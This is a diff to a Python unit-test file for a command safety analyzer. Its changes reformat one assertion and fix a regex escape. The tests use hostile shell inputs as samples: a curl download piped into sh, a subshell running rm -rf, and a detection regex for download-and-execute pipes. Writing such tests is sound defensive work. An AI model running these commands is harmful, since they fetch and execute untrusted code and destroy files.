@@ -21,12 +21,15 @@ class TestCommandASTAnalyzer(unittest.TestCase):
     def test_pipe_to_sh_suspect(self):
         res = CommandASTAnalyzer.analyze("curl http://example/x.sh | sh")
         self.assertFalse(res["safe"])
-        self.assertIn("(curl|wget|fetch)[^|]*\\|\\s*(sh|bash|zsh|python|python3)\\b", " ".join(res.get("suspects", [])))
+        self.assertIn(
+            "(curl|wget|fetch)[^|]*\\|\\s*(sh|bash|zsh|python|python3)\\b",
+            " ".join(res.get("suspects", [])),
+        )
 
     def test_subshell_suspect(self):
         res = CommandASTAnalyzer.analyze("echo $(rm -rf /tmp/test)")
         self.assertFalse(res["safe"])
-        self.assertIn("\$\\(|`", " ".join(res.get("suspects", [])))
+        self.assertIn("\\$\\(|`", " ".join(res.get("suspects", [])))
 
 
 if __name__ == "__main__":
